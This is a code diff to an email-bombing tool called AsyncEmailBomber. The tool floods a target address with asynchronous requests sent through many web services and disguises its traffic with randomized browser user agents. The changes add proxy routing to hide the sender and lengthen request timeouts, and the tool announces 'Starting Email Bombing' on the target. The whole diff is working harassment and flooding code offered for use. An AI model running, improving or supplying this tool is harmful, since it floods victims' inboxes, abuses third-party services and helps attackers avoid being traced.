@@ -35,10 +35,11 @@ def generate_dynamic_ua():
         return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_v.replace('_', '.')} Mobile/15E148 Safari/604.1"
 
 class AsyncEmailBomber:
-    def __init__(self, target, limit=0, concurrency=20):
+    def __init__(self, target, limit=0, concurrency=20, proxy=None):
         self.target = target
         self.limit = limit
         self.concurrency = concurrency
+        self.proxy = proxy
         self.sent = 0
         self.failed = 0
         self.running = False
@@ -157,10 +158,10 @@ class AsyncEmailBomber:
                     payload = None
 
                 if method == "POST":
-                    async with self.session.post(url, json=payload if p_type == "json" else None, data=payload if p_type == "data" else None, headers=headers, timeout=10) as res:
+                    async with self.session.post(url, json=payload if p_type == "json" else None, data=payload if p_type == "data" else None, headers=headers, proxy=self.proxy, timeout=15) as res:
                         success = res.status in [200, 201]
                 else:
-                    async with self.session.get(url.replace("{target}", target), headers=headers, timeout=10) as res:
+                    async with self.session.get(url.replace("{target}", target), headers=headers, proxy=self.proxy, timeout=15) as res:
                         success = res.status in [200, 201]
 
                 if success:
@@ -168,7 +169,7 @@ class AsyncEmailBomber:
                     print(f"  {Colorate.Horizontal(self.cl['num'], '[+]')} {Colorate.Horizontal(self.cl['txt'], f'Sent via {name}')}")
                 else:
                     self.failed += 1
-            except:
+            except Exception as e:
                 self.failed += 1
 
     async def start(self):
@@ -187,10 +188,10 @@ class AsyncEmailBomber:
                     tasks = []
             if tasks: await asyncio.gather(*tasks)
 
-def run_bomber(target, count):
+def run_bomber(target, count, proxy=None):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    bomber = AsyncEmailBomber(target, limit=count)
+    bomber = AsyncEmailBomber(target, limit=count, proxy=proxy)
     cl = Theme.get_colors()
     try:
         print(f"\n  {Colorate.Horizontal(cl['num'], '[*]')} {Colorate.Horizontal(cl['txt'], f'Starting Email Bombing on {target}...')}")
